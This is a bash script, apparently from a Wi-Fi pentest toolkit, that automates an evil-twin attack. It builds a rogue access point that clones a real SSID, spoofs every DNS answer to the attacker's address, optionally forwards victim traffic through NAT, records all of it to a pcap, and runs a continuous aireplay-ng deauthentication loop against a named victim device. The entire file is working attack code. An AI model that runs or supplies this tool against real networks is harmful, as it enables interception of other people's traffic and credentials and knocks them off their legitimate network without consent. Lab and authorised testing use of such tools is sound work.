#!/usr/bin/env bash
# Evil-twin orchestrator: brings up a rogue AP that clones a real one,
# fires continuous deauth at the victim on the real AP, and captures
# everything that comes through the rogue. Ctrl-C tears it all down.
#
# Layout:
#   monitor adapter  (e.g. wlan1mon) — used to deauth the real AP
#   rogue AP adapter (e.g. wlan2)    — broadcasts the cloned SSID
#   upstream         (e.g. eth0)     — NAT for victim's traffic (optional)
#
# Prereqs:
#   - monitor iface already in monitor mode (scripts/01-monitor-up.sh)
#   - second USB adapter present and not in monitor mode
#   - PMF disabled on the real AP (otherwise the deauth fails)
#
# Usage:
#   sudo ./10-evil-twin-attack.sh \
#       -B <real_bssid> -S <real_ssid> -C <victim_mac> \
#       -k <channel> -m <mon_iface> -a <ap_iface> \
#       [-u <upstream>] [-W <wpa-pass>]
#
# Open rogue (phone won't auto-join if real AP is WPA2):
#   sudo ./10-evil-twin-attack.sh \
#       -B AA:BB:CC:11:22:33 -S MyTestNetwork -C DD:EE:FF:44:55:66 \
#       -k 11 -m wlan1mon -a wlan2
#
# WPA2 rogue mirroring the real AP (phone may auto-join if password matches):
#   sudo ./10-evil-twin-attack.sh \
#       -B AA:BB:CC:11:22:33 -S MyTestNetwork -C DD:EE:FF:44:55:66 \
#       -k 11 -m wlan1mon -a wlan2 -W password123

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -B <real_bssid> -S <real_ssid> -C <victim_mac> -k <channel> -m <mon_iface> -a <ap_iface> [-u <upstream>] [-W <wpa-pass>]"
}

REAL_BSSID="" REAL_SSID="" VICTIM="" CHANNEL=""
MON_IFACE="" AP_IFACE=""
UPSTREAM_IFACE="eth0" WPA_PASS=""

while getopts "B:S:C:k:m:a:u:W:" opt; do
    case "$opt" in
        B) REAL_BSSID=$OPTARG ;;
        S) REAL_SSID=$OPTARG ;;
        C) VICTIM=$OPTARG ;;
        k) CHANNEL=$OPTARG ;;
        m) MON_IFACE=$OPTARG ;;
        a) AP_IFACE=$OPTARG ;;
        u) UPSTREAM_IFACE=$OPTARG ;;
        W) WPA_PASS=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$REAL_BSSID" || -z "$REAL_SSID" || -z "$VICTIM" || -z "$CHANNEL" \
    || -z "$MON_IFACE" || -z "$AP_IFACE" ]] && usage

[[ -d "/sys/class/net/$AP_IFACE"  ]] || die "AP iface $AP_IFACE not found. Plug in the second USB adapter."
[[ -d "/sys/class/net/$MON_IFACE" ]] || die "Monitor iface $MON_IFACE not found. Run scripts/01-monitor-up.sh first."

WORKDIR="$(mktemp -d -t eviltwin.XXXXXX)"
HOSTAPD_CONF="$WORKDIR/hostapd.conf"
DNSMASQ_CONF="$WORKDIR/dnsmasq.conf"
HOSTAPD_LOG="$WORKDIR/hostapd.log"
DNSMASQ_LOG="$WORKDIR/dnsmasq.log"
PCAP="$WORKDIR/rogue.pcap"

info "Workdir: $WORKDIR"

# --- Generate hostapd config ---
{
    echo "interface=$AP_IFACE"
    echo "driver=nl80211"
    echo "ssid=$REAL_SSID"
    echo "hw_mode=g"
    echo "channel=$CHANNEL"
    echo "ieee80211n=1"
    echo "auth_algs=1"
    echo "wmm_enabled=1"
    if [[ -n "$WPA_PASS" ]]; then
        echo "wpa=2"
        echo "wpa_key_mgmt=WPA-PSK"
        echo "wpa_pairwise=CCMP"
        echo "rsn_pairwise=CCMP"
        echo "wpa_passphrase=$WPA_PASS"
    fi
} > "$HOSTAPD_CONF"

# --- Generate dnsmasq config ---
cat > "$DNSMASQ_CONF" <<EOF
interface=$AP_IFACE
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
log-queries
log-facility=$DNSMASQ_LOG
EOF

# --- Take AP_IFACE away from NetworkManager ---
if command -v nmcli >/dev/null 2>&1; then
    info "Telling NetworkManager to leave $AP_IFACE alone..."
    nmcli device set "$AP_IFACE" managed no || true
fi

# --- Configure AP_IFACE ---
info "Configuring $AP_IFACE -> 10.0.0.1/24..."
ip addr flush dev "$AP_IFACE" || true
ip addr add 10.0.0.1/24 dev "$AP_IFACE"
ip link set "$AP_IFACE" up

# --- NAT (optional, only if upstream exists) ---
NAT_OK=0
if [[ -d "/sys/class/net/$UPSTREAM_IFACE" ]]; then
    info "Enabling NAT via $UPSTREAM_IFACE..."
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    iptables -t nat -A POSTROUTING -o "$UPSTREAM_IFACE" -j MASQUERADE
    iptables -A FORWARD -i "$AP_IFACE" -o "$UPSTREAM_IFACE" -j ACCEPT
    iptables -A FORWARD -i "$UPSTREAM_IFACE" -o "$AP_IFACE" \
        -m state --state RELATED,ESTABLISHED -j ACCEPT
    NAT_OK=1
else
    warn "Upstream $UPSTREAM_IFACE not present — skipping NAT (rogue is internet-less)."
fi

# --- Lock monitor adapter to channel ---
info "Locking $MON_IFACE to channel $CHANNEL..."
iw dev "$MON_IFACE" set channel "$CHANNEL"

# --- Start services in background ---
info "Starting hostapd ($HOSTAPD_LOG)..."
hostapd "$HOSTAPD_CONF" >"$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!

info "Starting dnsmasq ($DNSMASQ_LOG)..."
dnsmasq --no-daemon -C "$DNSMASQ_CONF" >>"$DNSMASQ_LOG" 2>&1 &
DNSMASQ_PID=$!

info "Starting tcpdump on $AP_IFACE -> $PCAP..."
tcpdump -i "$AP_IFACE" -n -s0 -w "$PCAP" >/dev/null 2>&1 &
TCPDUMP_PID=$!

cleanup() {
    trap - INT TERM EXIT
    info "Tearing down..."
    kill "$HOSTAPD_PID" "$DNSMASQ_PID" "$TCPDUMP_PID" 2>/dev/null || true
    wait "$HOSTAPD_PID" "$DNSMASQ_PID" "$TCPDUMP_PID" 2>/dev/null || true
    if (( NAT_OK == 1 )); then
        iptables -t nat -D POSTROUTING -o "$UPSTREAM_IFACE" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -i "$AP_IFACE" -o "$UPSTREAM_IFACE" -j ACCEPT 2>/dev/null || true
        iptables -D FORWARD -i "$UPSTREAM_IFACE" -o "$AP_IFACE" \
            -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
        sysctl -w net.ipv4.ip_forward=0 >/dev/null
    fi
    ip addr flush dev "$AP_IFACE" 2>/dev/null || true
    info "Artefacts left for the report:"
    info "  hostapd log : $HOSTAPD_LOG"
    info "  dnsmasq log : $DNSMASQ_LOG  (DHCP leases + DNS queries)"
    info "  pcap        : $PCAP"
    exit 0
}
trap cleanup INT TERM EXIT

# --- Verify hostapd actually came up ---
sleep 2
if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
    warn "hostapd died. Last lines of $HOSTAPD_LOG:"
    tail -20 "$HOSTAPD_LOG" >&2 || true
    exit 1
fi

info "Rogue AP up. SSID='$REAL_SSID' on channel $CHANNEL ($AP_IFACE)."
info "Watch for the phone to roam from the real AP to the rogue."
info "Tail DHCP leases:  tail -f $DNSMASQ_LOG"
info "Inspect pcap:      wireshark $PCAP"
info "Ctrl-C when done — everything tears down."
echo

# --- Continuous deauth loop in foreground ---
ROUND=0
while true; do
    ROUND=$((ROUND + 1))
    printf '%s[*] Round %d - deauth %s @ %s%s\n' "$GREEN" "$ROUND" "$VICTIM" "$REAL_BSSID" "$RESET"
    aireplay-ng --deauth 5 -a "$REAL_BSSID" -c "$VICTIM" "$MON_IFACE" || true
    sleep 5
done
